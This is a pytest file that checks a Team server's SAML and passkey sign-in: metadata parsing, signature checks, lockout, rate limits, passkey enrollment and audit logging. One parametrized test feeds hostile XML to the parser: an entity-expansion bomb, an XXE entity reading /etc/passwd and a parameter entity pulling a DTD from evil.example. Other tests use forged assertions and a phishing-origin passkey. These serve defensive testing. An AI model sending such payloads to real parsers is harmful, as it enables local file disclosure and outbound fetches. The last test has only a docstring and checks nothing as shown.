"""Team server sign-in settings (sso_saml.py, team_passkeys.py,
team_server.py, team_api.py, static/report_team.html, static/login.html):
an administrator sets SAML sign-in up on the Team server page (the
identity provider's metadata, or its entity ID, sign-on URL and signing
certificate), tests it and turns it on or off; a passkey is the second
factor after a password; an administrator can require one.

The identity provider and the passkeys are the test files' own
(tests/test_team_saml.py signs with a key made for the run;
tests/test_team_passkeys.py is a software authenticator). No network.

Proved: metadata gives the identity provider's values, and oversized,
DTD- or entity-bearing metadata is refused; SAML saved on the page signs
the matching account in and still refuses an unsigned assertion; SAML
cannot be turned on half-configured or over the environment's settings;
the test reads nothing from the identity provider; a password sign-in of
an account with a passkey gets no session until its own passkey answers;
with "require passkey" on, a password-only sign-in gets no session (the
account adds a passkey first); failed passkeys lock the account and
refused SAML responses are rate limited per address."""
from __future__ import annotations

import base64
import re
from pathlib import Path

import pytest
from cryptography import x509
from cryptography.hazmat.primitives import serialization
from fastapi.testclient import TestClient

import audit
import dlp_api_server as srv
import sso
import sso_saml
import team_passkeys
import team_server as team
from test_team_passkeys import SoftAuthenticator
from test_team_saml import (DS, EVIL_CERT, IDP, IDP_CERT, IDP_SSO, assertion, response, sign, xml, _request_id_of)

ROOT = Path(__file__).resolve().parents[1]
ORIGIN = "https://zme.example.test"
ACS = ORIGIN + sso_saml.ACS_PATH
SP = ORIGIN + sso_saml.METADATA_PATH
PW = "correct horse battery staple"
MD = sso_saml.NS["md"]
H = {"Origin": ORIGIN}


def metadata(*, entity=IDP, sso_url=IDP_SSO, cert=IDP_CERT, binding=sso_saml.BINDING_REDIRECT, use="signing", idps=1) -> str:
    der = base64.b64encode(x509.load_pem_x509_certificate(cert).public_bytes(serialization.Encoding.DER)).decode()
    idp = (f'<md:IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">'
           f'<md:KeyDescriptor use="{use}"><ds:KeyInfo><ds:X509Data><ds:X509Certificate>{der}</ds:X509Certificate>'
           f'</ds:X509Data></ds:KeyInfo></md:KeyDescriptor>'
           f'<md:SingleSignOnService Binding="{binding}" Location="{sso_url}"/></md:IDPSSODescriptor>')
    return (f'<?xml version="1.0" encoding="UTF-8"?><md:EntityDescriptor xmlns:md="{MD}" xmlns:ds="{DS}" entityID="{entity}">'
            + idp * idps + '</md:EntityDescriptor>')


@pytest.fixture
def team_on(monkeypatch):
    monkeypatch.setenv("ZSCALER_TEAM_MODE", "1")
    monkeypatch.setenv("ZSCALER_TEAM_PASSKEY_ORIGIN", ORIGIN)
    for k in ("ZSCALER_SAML_ENABLED", "ZSCALER_SAML_ALLOWED_GROUPS", "ZSCALER_SAML_IDP_CERT_FILE"):
        monkeypatch.delenv(k, raising=False)
    monkeypatch.setattr(team, "SCRYPT_LOG_N", 10)
    monkeypatch.setattr(team, "_DUMMY_HASH", None)
    team._FAILURES.clear()
    team._IP_ATTEMPTS.clear()
    team._CACHE.update(key=None, data=None)
    sso._SESSIONS.clear()
    sso_saml.reset()
    team_passkeys.reset()
    yield
    sso_saml.reset()
    team_passkeys.reset()
    sso._SESSIONS.clear()
    team._CACHE.update(key=None, data=None)


def _client():
    return TestClient(srv.app, base_url=ORIGIN, follow_redirects=False)


def _admin():
    if not team.find_user("root"):
        team.create_user(username="root", role="admin", password=PW)
    c = _client()
    assert c.post("/api/auth/team/login", json={"username": "root", "password": PW}, headers=H).json()["ok"] is True
    return c


def _save(c, **saml):
    return c.post("/api/team/sign-in", json={"saml": saml}, headers=H)


def _full(c, enabled=True):
    return _save(c, metadata=metadata(), sp_entity_id=SP, acs_url=ACS, enabled=enabled)


# ── 1. identity provider metadata: an untrusted upload ──────────────────
def test_metadata_gives_the_entity_id_redirect_sign_on_url_and_signing_certificate(team_on):
    """ASVS V5.5.2 · CWE-20 · WSTG-INPV-07: the parser takes the entityID, the HTTP-Redirect sign-on URL and the signing certificate, as PEM."""
    got = sso_saml.parse_idp_metadata(metadata())
    assert got["idp_entity_id"] == IDP and got["idp_sso_url"] == IDP_SSO
    assert x509.load_pem_x509_certificate(got["idp_cert_pem"].encode()) == x509.load_pem_x509_certificate(IDP_CERT)


def test_oversized_metadata_is_refused(team_on):
    """ASVS V12.1.1 · CWE-400 · WSTG-BUSL-09: metadata over MAX_METADATA is refused before it is parsed."""
    doc = metadata().replace("</md:EntityDescriptor>", "<!--" + "x" * sso_saml.MAX_METADATA + "--></md:EntityDescriptor>")
    with pytest.raises(sso_saml.SamlError, match="larger than"):
        sso_saml.parse_idp_metadata(doc)


@pytest.mark.parametrize("doc", [
    # entity expansion ("billion laughs")
    '<?xml version="1.0"?><!DOCTYPE m [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>'
    f'<md:EntityDescriptor xmlns:md="{MD}" entityID="&b;"/>',
    # an external entity (XXE): a local file
    '<?xml version="1.0"?><!DOCTYPE m [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
    f'<md:EntityDescriptor xmlns:md="{MD}" entityID="&x;"/>',
    # a parameter entity fetched from the network
    '<?xml version="1.0"?><!DOCTYPE m [<!ENTITY % p SYSTEM "http://evil.example/x.dtd"> %p;]>'
    f'<md:EntityDescriptor xmlns:md="{MD}" entityID="e"/>',
    # a bare DOCTYPE, lower case
    f'<!doctype m><md:EntityDescriptor xmlns:md="{MD}" entityID="e"/>',
])
def test_metadata_with_a_dtd_or_an_entity_is_refused(team_on, doc):
    """ASVS V5.5.2 · CWE-611 · CWE-776 · WSTG-INPV-07: a DTD, an internal, external or parameter entity in uploaded metadata is refused, never expanded or fetched."""
    with pytest.raises(sso_saml.SamlError, match="DTD or an entity"):
        sso_saml.parse_idp_metadata(doc)


@pytest.mark.parametrize("kw,needle", [
    ({"binding": sso_saml.BINDING_POST}, "HTTP-Redirect"),
    ({"use": "encryption"}, "no signing certificate"),
    ({"idps": 2}, "exactly one identity provider"),
    ({"entity": ""}, "entityID"),
])
def test_metadata_without_what_sign_in_needs_is_refused(team_on, kw, needle):
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-07: no Redirect sign-on service, no signing certificate, two identity providers or no entityID: refused with the reason."""
    with pytest.raises(sso_saml.SamlError, match=needle):
        sso_saml.parse_idp_metadata(metadata(**kw))


def test_malformed_or_foreign_xml_is_refused(team_on):
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-07: not XML, or XML that is not SAML metadata, is refused."""
    for doc, needle in (("<md:EntityDescriptor", "well-formed"), ("<html><body/></html>", "not SAML metadata"), ("", "XML text")):
        with pytest.raises(sso_saml.SamlError, match=needle):
            sso_saml.parse_idp_metadata(doc)


def test_the_page_refuses_oversized_or_entity_bearing_metadata_and_saves_nothing(team_on):
    """ASVS V5.5.2 · CWE-611 · WSTG-INPV-07: through the Team server page's call, bad metadata is a 400 and the saved settings stay empty."""
    c = _admin()
    big = metadata().replace("</md:EntityDescriptor>", "<!--" + "x" * sso_saml.MAX_METADATA + "--></md:EntityDescriptor>")
    xxe = '<?xml version="1.0"?><!DOCTYPE m [<!ENTITY x SYSTEM "file:///etc/passwd">]><m>&x;</m>'
    for doc in (big, xxe):
        r = _save(c, metadata=doc)
        assert r.status_code == 400, r.text[:200]
        assert "root:" not in r.text
    assert team.saml_settings() == {}


# ── 2. setting SAML up on the page ──────────────────────────────────────
def test_an_administrator_saves_metadata_and_turns_saml_on(team_on):
    """ASVS V2.10.1 · CWE-1188 · WSTG-CONF-02: metadata plus this server's entity ID and ACS URL, then on: the status advertises SAML and the page shows public values only."""
    c = _admin()
    r = _full(c)
    assert r.status_code == 200, r.text
    view = r.json()["saml"]
    assert view["source"] == "page" and view["enabled"] is True and view["idp_entity_id"] == IDP and view["errors"] == []
    assert view["certificates"][0]["sha256"].count(":") == 31 and "idp_cert_pem" not in view
    assert c.get("/api/auth/status").json()["saml"] is True
    assert c.get("/api/team/overview").json()["sign_in"]["saml"]["enabled"] is True


def test_saml_cannot_be_turned_on_half_configured_or_with_unsafe_addresses(team_on):
    """ASVS V14.1.1 · CWE-1188 · WSTG-CONF-02: turning on without every value, or with an http:// sign-on URL or a wrong ACS path, is refused and SAML stays off."""
    c = _admin()
    r = _save(c, idp_entity_id=IDP, enabled=True)
    assert r.status_code == 400 and "cannot be turned on" in r.json()["detail"]
    assert _save(c, metadata=metadata(sso_url="http://idp.example.test/sso")).status_code == 400
    assert _save(c, acs_url=ORIGIN + "/somewhere/else").status_code == 400
    assert _save(c, idp_cert_pem="not a certificate").status_code == 400
    assert sso_saml.enabled() is False and c.get(sso_saml.LOGIN_PATH).status_code == 404


def test_only_an_administrator_changes_sign_in_settings(team_on):
    """ASVS V4.1.3 · CWE-285 · WSTG-ATHZ-02: an operator's call to change or test the sign-in settings is refused."""
    team.create_user(username="olive", role="operator", password=PW)
    c = _client()
    c.post("/api/auth/team/login", json={"username": "olive", "password": PW}, headers=H)
    assert _save(c, metadata=metadata()).status_code == 403
    assert c.post("/api/team/sign-in", json={"require_passkey": False}, headers=H).status_code == 403
    assert c.post("/api/team/sign-in/test-saml", headers=H).status_code == 403
    assert team.saml_settings() == {}


def test_settings_from_the_environment_are_shown_but_not_changed_on_the_page(team_on, monkeypatch, tmp_path):
    """ASVS V14.1.1 · CWE-15 · WSTG-CONF-02: with ZSCALER_SAML_ENABLED the environment rules: the page shows its values read-only and refuses to change them."""
    pem = tmp_path / "idp.pem"
    pem.write_bytes(IDP_CERT)
    for k, v in {"ZSCALER_SAML_ENABLED": "1", "ZSCALER_SAML_IDP_ENTITY_ID": IDP, "ZSCALER_SAML_IDP_SSO_URL": IDP_SSO,
                 "ZSCALER_SAML_IDP_CERT_FILE": str(pem), "ZSCALER_SAML_SP_ENTITY_ID": SP, "ZSCALER_SAML_ACS_URL": ACS}.items():
        monkeypatch.setenv(k, v)
    c = _admin()
    view = c.get("/api/team/overview").json()["sign_in"]["saml"]
    assert view["source"] == "environment" and view["idp_sso_url"] == IDP_SSO and view["certificates"]
    r = _save(c, enabled=False)
    assert r.status_code == 400 and "environment" in r.json()["detail"]


def test_the_test_checks_locally_and_names_the_problems(team_on, monkeypatch):
    """ASVS V14.1.1 · CWE-1188 · WSTG-CONF-02: Test reports what is missing, then the request this server would send; it makes no outbound call."""
    c = _admin()
    out = c.post("/api/team/sign-in/test-saml", headers=H).json()
    assert out["ok"] is False and any("entity ID is missing" in p for p in out["problems"])
    _full(c, enabled=False)
    import socket
    monkeypatch.setattr(socket, "create_connection", lambda *a, **k: pytest.fail("the test must not call out"))
    out = c.post("/api/team/sign-in/test-saml", headers=H).json()
    assert out["ok"] is True and out["request"]["destination"] == IDP_SSO and out["request"]["acs_url"] == ACS


def _sign_in_with_saml(c, body_of):
    r = c.get(sso_saml.LOGIN_PATH)
    assert r.status_code == 302, r.text
    rid = _request_id_of(r.headers["location"])
    from urllib.parse import parse_qs, urlparse
    relay = parse_qs(urlparse(r.headers["location"]).query)["RelayState"][0]
    r = c.post(sso_saml.ACS_PATH, data={"SAMLResponse": base64.b64encode(body_of(rid)).decode(), "RelayState": relay},
               headers={"Origin": "https://idp.example.test"})
    return c.get(r.headers["location"]) if r.status_code == 303 else r


def test_saml_saved_on_the_page_signs_the_account_in_and_still_refuses_an_unsigned_assertion(team_on):
    """ASVS V2.10.1 · CWE-347 · WSTG-ATHN-04: with page-saved settings a signed assertion signs the matching account in; an unsigned one and one signed by another key are refused."""
    _full(_admin())
    team.create_user(username="alice@corp.example", role="viewer")
    c = _client()
    r = _sign_in_with_saml(c, lambda rid: xml(response(rid, [sign(assertion(rid, recipient=ACS, audience=SP), cert=IDP_CERT)], destination=ACS)))
    assert r.status_code == 303 and r.headers["location"] == "/", r.text
    assert c.get("/api/team/me").json()["user"]["username"] == "alice@corp.example"
    def unsigned(rid):
        a = assertion(rid, recipient=ACS, audience=SP)
        a.remove(a.find(f"{{{DS}}}Signature"))
        return xml(response(rid, [a], destination=ACS))
    c2 = _client()
    r = _sign_in_with_saml(c2, unsigned)
    assert r.status_code == 401 and "not signed" in r.text
    from test_team_saml import EVIL_KEY
    r = _sign_in_with_saml(c2, lambda rid: xml(response(rid, [sign(assertion(rid, recipient=ACS, audience=SP), key=EVIL_KEY, cert=EVIL_CERT)],
                                                         destination=ACS)))
    assert r.status_code == 401 and c2.get("/api/team/me").status_code == 401


def test_turning_saml_off_on_the_page_closes_it(team_on):
    """ASVS V14.1.1 · CWE-1188 · WSTG-CONF-02: off again, the sign-in start and the ACS answer 404 and the Origin exemption is gone."""
    c = _admin()
    _full(c)
    assert _save(c, enabled=False).status_code == 200
    assert c.get(sso_saml.LOGIN_PATH).status_code == 404
    import security
    assert security._saml_acs_open() is False


def test_refused_saml_responses_are_rate_limited_per_address(team_on, monkeypatch):
    """ASVS V2.2.1 · CWE-307 · WSTG-ATHN-03: after LOGIN_IP_ATTEMPTS refused responses from one address the ACS answers 429 before it parses anything."""
    _full(_admin())
    team._IP_ATTEMPTS.clear()
    monkeypatch.setattr(team, "LOGIN_IP_ATTEMPTS", 2)
    c = _client()
    codes = [c.post(sso_saml.ACS_PATH, data={"SAMLResponse": base64.b64encode(b"<x/>").decode()},
                    headers={"Origin": "https://idp.example.test"}).status_code for _ in range(3)]
    assert codes == [401, 401, 429]


def test_a_locked_account_cannot_sign_in_with_saml(team_on, monkeypatch):
    """ASVS V2.2.1 · CWE-307 · WSTG-ATHN-03: an account locked by failed sign-ins is refused at the SAML finish step too."""
    monkeypatch.setenv("ZSCALER_TEAM_LOCKOUT_ATTEMPTS", "1")
    _full(_admin())
    u = team.create_user(username="alice@corp.example", role="viewer", password=PW)
    _client().post("/api/auth/team/login", json={"username": "alice@corp.example", "password": "wrong password!!"}, headers=H)
    assert team.is_locked(team.get_user(u["id"]))
    c = _client()
    r = _sign_in_with_saml(c, lambda rid: xml(response(rid, [sign(assertion(rid, recipient=ACS, audience=SP))], destination=ACS)))
    assert r.status_code == 423 and c.get("/api/team/me").status_code == 401


# ── 3. a passkey after the password ─────────────────────────────────────
def _password(c, name="alice"):
    return c.post("/api/auth/team/login", json={"username": name, "password": PW}, headers=H)


def _with_passkey(name="alice"):
    """An account with one registered passkey (added while passkeys were optional)."""
    team.create_user(username=name, role="operator", password=PW)
    c = _client()
    assert _password(c, name).json()["ok"] is True
    auth = SoftAuthenticator()
    o = c.post("/api/team/me/passkeys/options", json={"current": PW}, headers=H).json()["options"]
    assert c.post("/api/team/me/passkeys", json={"credential": auth.create(o), "name": "Laptop"}, headers=H).status_code == 200
    sso._SESSIONS.clear()
    return auth


def test_a_password_sign_in_of_an_account_with_a_passkey_gets_no_session_until_its_passkey_answers(team_on):
    """ASVS V2.2.3 · V2.8.1 · CWE-308 · WSTG-ATHN-04: the right password returns a passkey challenge for that account only and no session; the passkey then signs it in."""
    auth = _with_passkey()
    c = _client()
    r = _password(c)
    j = r.json()
    assert r.status_code == 200 and j["ok"] is False and j["next"] == "passkey"
    assert "set-cookie" not in r.headers and c.get("/api/team/me").status_code == 401 and not sso._SESSIONS
    assert [x["id"] for x in j["options"]["allowCredentials"]] == [base64.urlsafe_b64encode(auth.cred_id).rstrip(b"=").decode()]
    r = c.post("/api/auth/team/passkey/login", json={"ceremony": j["ceremony"], "credential": auth.get(j["options"])}, headers=H)
    assert r.status_code == 200 and r.json()["user"] == "alice"
    assert c.get("/api/team/me").status_code == 200
    assert next(iter(sso._SESSIONS.values()))["via"] == "password+passkey"


def test_the_second_factor_takes_only_the_accounts_own_passkey_once(team_on):
    """ASVS V2.8.1 · CWE-294 · WSTG-ATHN-04: another account's valid passkey does not finish this password sign-in, and a used ceremony cannot be replayed."""
    alice = _with_passkey("alice")
    bob = _with_passkey("bob")
    c = _client()
    j = _password(c, "alice").json()
    r = c.post("/api/auth/team/passkey/login", json={"ceremony": j["ceremony"], "credential": bob.get(j["options"])}, headers=H)
    assert r.status_code == 401 and not sso._SESSIONS
    j = _password(c, "alice").json()
    cred = alice.get(j["options"])
    assert c.post("/api/auth/team/passkey/login", json={"ceremony": j["ceremony"], "credential": cred}, headers=H).status_code == 200
    r = _client().post("/api/auth/team/passkey/login", json={"ceremony": j["ceremony"], "credential": cred}, headers=H)
    assert r.status_code == 401 and "already used" in r.json()["detail"]


def test_failed_passkeys_lock_the_account_like_wrong_passwords(team_on, monkeypatch):
    """ASVS V2.2.1 · CWE-307 · WSTG-ATHN-03: a passkey that does not verify after the right password counts towards the lockout; once locked, even the right password is refused."""
    from cryptography.hazmat.primitives.asymmetric import ec
    monkeypatch.setenv("ZSCALER_TEAM_LOCKOUT_ATTEMPTS", "2")
    auth = _with_passkey()
    forged = ec.generate_private_key(ec.SECP256R1())
    for _ in range(2):
        c = _client()
        j = _password(c).json()
        r = c.post("/api/auth/team/passkey/login", json={"ceremony": j["ceremony"], "credential": auth.get(j["options"], key=forged)}, headers=H)
        assert r.status_code == 401
    assert team.is_locked(team.find_user("alice"))
    assert _password(_client()).status_code == 423


# ── 4. passkeys required ────────────────────────────────────────────────
def test_passkeys_cannot_be_required_before_they_are_set_up(team_on, monkeypatch):
    """ASVS V2.1.1 · CWE-1188 · WSTG-CONF-02: without ZSCALER_TEAM_PASSKEY_ORIGIN, requiring passkeys is refused (it would lock everybody out)."""
    c = _admin()
    monkeypatch.delenv("ZSCALER_TEAM_PASSKEY_ORIGIN")
    r = c.post("/api/team/sign-in", json={"require_passkey": True}, headers=H)
    assert r.status_code == 409 and team.require_passkey() is False


def test_with_passkeys_required_a_password_only_sign_in_gets_no_session(team_on):
    """ASVS V2.2.3 · CWE-308 · WSTG-ATHN-04: require passkey on: the right password of an account without a passkey returns an enrollment step and no session cookie."""
    c = _admin()
    assert c.post("/api/team/sign-in", json={"require_passkey": True}, headers=H).json()["require_passkey"] is True
    team.create_user(username="carol", role="viewer", password=PW)
    sso._SESSIONS.clear()
    c2 = _client()
    r = _password(c2, "carol")
    assert r.status_code == 200 and r.json()["ok"] is False and r.json()["next"] == "enroll_passkey"
    assert "set-cookie" not in r.headers and not sso._SESSIONS
    assert c2.get("/api/team/me").status_code == 401


def test_with_passkeys_required_the_account_adds_one_and_is_then_signed_in(team_on):
    """ASVS V2.8.1 · CWE-308 · WSTG-ATHN-04: the enrollment ceremony from the password step stores the new passkey and starts the session; it is single use."""
    c = _admin()
    c.post("/api/team/sign-in", json={"require_passkey": True}, headers=H)
    team.create_user(username="carol", role="viewer", password=PW)
    c2 = _client()
    j = _password(c2, "carol").json()
    auth = SoftAuthenticator()
    cred = auth.create(j["options"])
    r = c2.post("/api/auth/team/passkey/enroll", json={"ceremony": j["ceremony"], "credential": cred, "name": "Phone"}, headers=H)
    assert r.status_code == 200 and r.json()["user"] == "carol"
    assert c2.get("/api/team/me").json()["user"]["passkeys"][0]["name"] == "Phone"
    r = _client().post("/api/auth/team/passkey/enroll", json={"ceremony": j["ceremony"], "credential": cred}, headers=H)
    assert r.status_code == 401
    j = _password(_client(), "carol").json()
    assert j["next"] == "passkey"


def test_an_enrollment_from_a_phishing_origin_is_refused(team_on):
    """ASVS V2.8.1 · CWE-346 · WSTG-ATHN-04: a passkey made on another origin during enrollment is not stored and signs nobody in."""
    c = _admin()
    c.post("/api/team/sign-in", json={"require_passkey": True}, headers=H)
    team.create_user(username="carol", role="viewer", password=PW)
    sso._SESSIONS.clear()
    j = _password(_client(), "carol").json()
    cred = SoftAuthenticator().create(j["options"], origin="https://zme.example.test.evil.example")
    r = _client().post("/api/auth/team/passkey/enroll", json={"ceremony": j["ceremony"], "credential": cred}, headers=H)
    assert r.status_code == 401 and not sso._SESSIONS and not team.find_user("carol").get("passkeys")


def test_required_passkeys_without_passkey_setup_fail_closed(team_on, monkeypatch):
    """ASVS V2.1.1 · CWE-636 · WSTG-CONF-02: required, then the passkey origin is removed: password sign-in fails closed with the fix named, never a password-only session."""
    c = _admin()
    c.post("/api/team/sign-in", json={"require_passkey": True}, headers=H)
    team.create_user(username="carol", role="viewer", password=PW)
    sso._SESSIONS.clear()
    monkeypatch.delenv("ZSCALER_TEAM_PASSKEY_ORIGIN")
    r = _password(_client(), "carol")
    assert r.status_code == 503 and "require-passkey off" in r.json()["detail"] and not sso._SESSIONS


def test_the_command_line_can_turn_the_requirement_off_and_remove_passkeys(team_on, capsys):
    """ASVS V2.5.6 · CWE-640 · WSTG-ATHN-09: an operator on the server can recover from a lost device: remove an account's passkeys, and stop requiring passkeys."""
    _with_passkey("alice")
    team.set_require_passkey(True, by="t")
    assert team._cli(["remove-passkeys", "alice"]) == 0 and not team.find_user("alice").get("passkeys")
    assert team._cli(["require-passkey", "off"]) == 0 and team.require_passkey() is False
    assert team._cli(["require-passkey", "on"]) == 2


def test_sign_in_settings_changes_are_audited(team_on, monkeypatch):
    """ASVS V7.2.2 · CWE-778 · WSTG-CONF-02: saving SAML settings and requiring passkeys write audit entries naming the administrator."""
    seen = []
    c = _admin()
    monkeypatch.setattr(audit, "record", lambda e, **f: seen.append((e, f)))
    _full(c)
    c.post("/api/team/sign-in", json={"require_passkey": True}, headers=H)
    assert ("team_saml_settings_saved", "root") in [(e, f.get("actor")) for e, f in seen]
    assert ("team_require_passkey", "root") in [(e, f.get("actor")) for e, f in seen]


# ── fixes after verify ──────────────────────────────────────────────────
def test_an_account_with_a_passkey_never_falls_back_to_its_password_when_passkeys_are_not_set_up(team_on, monkeypatch):
    """ASVS V2.1.1 · V2.8.1 · CWE-636 · WSTG-ATHN-04: the passkey origin is removed (require passkey off): an account with a passkey gets 503 naming the fix and an audit entry, never a password-only session."""
    _with_passkey()
    monkeypatch.delenv("ZSCALER_TEAM_PASSKEY_ORIGIN")
    seen = []
    monkeypatch.setattr(audit, "record", lambda e, **f: seen.append((e, f)))
    c = _client()
    r = _password(c)
    assert r.status_code == 503 and "remove-passkeys" in r.json()["detail"]
    assert "set-cookie" not in r.headers and not sso._SESSIONS and c.get("/api/team/me").status_code == 401
    assert any(e == "team_login_failed" and "has a passkey" in f.get("reason", "") for e, f in seen)


def test_an_account_without_a_passkey_still_signs_in_with_its_password_when_passkeys_are_not_set_up(team_on, monkeypatch):
    """ASVS V2.1.1 · CWE-636 · WSTG-ATHN-04: boundary: passkeys not set up and not required, an account with no passkey signs in with its password."""
    team.create_user(username="erin", role="viewer", password=PW)
    monkeypatch.delenv("ZSCALER_TEAM_PASSKEY_ORIGIN")
    assert _password(_client(), "erin").json()["ok"] is True


def _saml_as(c, email):
    return _sign_in_with_saml(c, lambda rid: xml(response(rid, [sign(assertion(rid, recipient=ACS, audience=SP, nameid=email, email=email),
                                                                    cert=IDP_CERT)], destination=ACS)))


def test_saml_never_links_an_administrator_account_by_its_email_alone(team_on, monkeypatch):
    """ASVS V2.10.1 · V4.1.3 · CWE-287 · WSTG-ATHN-04: a verified SAML sign-in whose email matches an unlinked administrator account is refused and audited; the account stays unlinked."""
    _full(_admin())
    adm = team.create_user(username="boss@corp.example", role="admin", password=PW)
    seen = []
    monkeypatch.setattr(audit, "record", lambda e, **f: seen.append((e, f)))
    c = _client()
    r = _saml_as(c, "boss@corp.example")
    assert r.status_code == 403 and "Allow SAML link" in r.text
    assert c.get("/api/team/me").status_code == 401 and not team.get_user(adm["id"]).get("saml_sub")
    assert "team_saml_link_refused" in [e for e, _ in seen]


def test_saml_still_links_a_non_administrator_by_email(team_on):
    """ASVS V2.10.1 · CWE-287 · WSTG-ATHN-04: boundary: an operator account is linked by its asserted email on its first SAML sign-in, as before."""
    _full(_admin())
    team.create_user(username="olga@corp.example", role="operator")
    c = _client()
    assert _saml_as(c, "olga@corp.example").status_code == 303
    assert c.get("/api/team/me").json()["user"]["saml_linked"] is True


def test_an_administrator_account_links_only_after_an_administrator_allows_it_and_only_for_a_while(team_on, monkeypatch):
    """ASVS V2.10.1 · V4.1.3 · CWE-287 · WSTG-ATHN-04: Allow SAML link lets the next SAML sign-in within the window link the administrator account (audited, used once); after the window it is refused."""
    root = _admin()
    _full(root)
    adm = team.create_user(username="boss@corp.example", role="admin", password=PW)
    now = [1_000_000.0]
    monkeypatch.setattr(team, "_clock", lambda: now[0])
    seen = []
    monkeypatch.setattr(audit, "record", lambda e, **f: seen.append((e, f)))
    r = root.post(f"/api/team/users/{adm['id']}", json={"allow_saml_link": True}, headers=H)
    assert r.status_code == 200 and r.json()["user"]["saml_link_allowed"] is True
    assert ("team_saml_link_allowed", "root") in [(e, f.get("actor")) for e, f in seen]
    now[0] += team.SAML_LINK_SECONDS + 1
    assert _saml_as(_client(), "boss@corp.example").status_code == 403
    root.post(f"/api/team/users/{adm['id']}", json={"allow_saml_link": True}, headers=H)
    c = _client()
    assert _saml_as(c, "boss@corp.example").status_code == 303
    assert c.get("/api/team/me").json()["user"]["username"] == "boss@corp.example"
    assert team.get_user(adm["id"]).get("saml_link_until") is None
    assert root.post(f"/api/team/users/{adm['id']}", json={"allow_saml_link": True}, headers=H).status_code == 409


def test_only_an_administrator_can_allow_a_saml_link(team_on):
    """ASVS V4.1.3 · CWE-285 · WSTG-ATHZ-02: a non-administrator cannot allow a SAML link for an administrator account."""
    root = _admin()
    adm = team.create_user(username="boss@corp.example", role="admin", password=PW)
    team.create_user(username="vic", role="operator", password=PW)
    c = _client()
    assert _password(c, "vic").json()["ok"] is True
    assert c.post(f"/api/team/users/{adm['id']}", json={"allow_saml_link": True}, headers=H).status_code == 403
    assert not team.get_user(adm["id"]).get("saml_link_until")


def test_an_account_with_no_password_adds_a_passkey_only_from_a_recent_sign_in(team_on, monkeypatch):
    """ASVS V2.5.3 · V3.7.1 · CWE-306 · WSTG-ATHN-04: an SSO or SAML account (no password) cannot add a passkey from a session older than RECENT_SIGN_IN_SECONDS; a fresh one can."""
    import team_api
    u = team.create_user(username="sam@corp.example", role="viewer")
    sid = team.start_session(u, via="saml")
    c = _client()
    import security
    c.cookies.set(security.SSO_SESSION_COOKIE, sid)
    sso._SESSIONS[sid]["created"] -= team_api.RECENT_SIGN_IN_SECONDS + 1
    r = c.post("/api/team/me/passkeys/options", json={}, headers=H)
    assert r.status_code == 403 and "sign in again" in r.json()["detail"]
    sso._SESSIONS[sid]["created"] = team._clock()
    assert c.post("/api/team/me/passkeys/options", json={}, headers=H).status_code == 200


@pytest.mark.parametrize("start", ["passkey", "saml"])
def test_starting_sign_ins_is_limited_per_address(team_on, monkeypatch, start):
    """ASVS V2.2.1 · CWE-770 · WSTG-ATHN-03: an address cannot start unlimited passkey or SAML sign-ins (each fills a capped shared map): over the limit it gets 429."""
    if start == "saml":
        _full(_admin())
    team._IP_ATTEMPTS.clear()
    monkeypatch.setattr(team, "START_IP_ATTEMPTS", 2)
    c = _client()
    go = (lambda: c.post("/api/auth/team/passkey/options", headers=H)) if start == "passkey" else (lambda: c.get(sso_saml.LOGIN_PATH))
    codes = [go().status_code for _ in range(3)]
    assert codes[:2] != [429, 429] and codes[2] == 429


def test_a_saml_response_without_the_relay_state_is_refused(team_on):
    """ASVS V3.2.1 · CWE-352 · WSTG-SESS-05: the ACS refuses a valid response that does not carry back the RelayState of the sign-in this server started."""
    _full(_admin())
    team.create_user(username="alice@corp.example", role="viewer")
    c = _client()
    r = c.get(sso_saml.LOGIN_PATH)
    rid = _request_id_of(r.headers["location"])
    body = xml(response(rid, [sign(assertion(rid, recipient=ACS, audience=SP), cert=IDP_CERT)], destination=ACS))
    r = c.post(sso_saml.ACS_PATH, data={"SAMLResponse": base64.b64encode(body).decode()}, headers={"Origin": "https://idp.example.test"})
    assert r.status_code == 401 and "RelayState" in r.text and c.get("/api/team/me").status_code == 401


def test_audit_records_carry_no_saml_response_or_passkey_credential_bytes(team_on, monkeypatch, caplog, tmp_path):
    """ASVS V7.1.1 · CWE-532 · WSTG-ERRH-01: after a refused and an accepted SAML sign-in and a password+passkey sign-in, no audit entry or log line holds the SAML response, its signature or any credential bytes."""
    import json as _json
    import logging
    caplog.set_level(logging.DEBUG)
    _full(_admin())
    team.create_user(username="alice@corp.example", role="viewer")
    auth = _with_passkey("pk")
    monkeypatch.setenv("DLP_CHECK_AUDIT", str(tmp_path / "audit.log"))
    secrets_ = []

    def body(rid, key=None):
        kw = {"key": key} if key else {}
        b = xml(response(rid, [sign(assertion(rid, recipient=ACS, audience=SP), cert=IDP_CERT, **kw)], destination=ACS))
        secrets_.append(base64.b64encode(b).decode())
        secrets_.extend(m.decode() for m in re.findall(rb"<ds:SignatureValue>([^<]{20,})</ds:SignatureValue>", b))
        return b
    from test_team_saml import EVIL_KEY
    _sign_in_with_saml(_client(), lambda rid: body(rid, EVIL_KEY))
    assert _sign_in_with_saml(_client(), body).status_code == 303
    c = _client()
    j = _password(c, "pk").json()
    cred = auth.get(j["options"])
    secrets_.extend(v for v in cred["response"].values() if isinstance(v, str) and len(v) > 16)
    assert c.post("/api/auth/team/passkey/login", json={"ceremony": j["ceremony"], "credential": cred}, headers=H).status_code == 200
    written = audit.tail(10000)
    assert {"team_login", "team_login_failed", "api"} <= {e.get("event") for e in written} and len(secrets_) >= 6
    dump = _json.dumps(written, default=str) + caplog.text
    leaked = [s[:24] for s in secrets_ if s[:40] in dump]
    assert not leaked, leaked


# ── 5. the pages ────────────────────────────────────────────────────────
NEW_CONTROLS = {"/report/team": ["#tmSamlMeta", "#tmSamlFile", "#tmSamlIdp", "#tmSamlSso", "#tmSamlCert", "#tmSamlSp", "#tmSamlAcs",
                                 "#tmSamlGroups", "#tmSamlSave", "#tmSamlTest", "#tmSamlOn", "#tmReqPk", "#tmPkName", "#tmPkCur",
                                 "#tmPkAdd"],
                "/login": ["#lgSamlBtn", "#lgPasskeyBtn", "#lgPkGo"]}


def test_the_new_controls_have_help_in_both_identical_catalogues():
    """WCAG 2.2 SC 3.3.5 · CWE-1059: every new sign-in control has a help entry, and the extension's catalogue copy is byte-identical."""
